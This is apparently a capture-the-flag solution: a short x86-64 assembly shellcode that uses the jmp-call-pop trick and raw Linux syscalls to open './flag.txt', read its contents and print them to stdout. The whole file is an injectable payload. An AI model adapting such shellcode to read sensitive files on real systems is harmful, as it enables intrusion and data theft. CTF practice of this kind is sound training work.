BITS 64

global _start

section .text

_start:
    jmp push_filename

open_and_read:
    pop rdi
    xor rsi, rsi
    mov rax, 0x2
    syscall

    sub rsp, 0xfff
    lea rsi, [rsp]
    mov rdi, rax
    mov rdx, 0xfff
    xor rax, rax
    syscall

    mov rdi, 1
    mov rdx, rax
    mov rax, 1
    syscall

    xor rax, rax
    mov rax, 0x3c
    syscall

push_filename:
    call open_and_read

    path: db "./flag.txt"
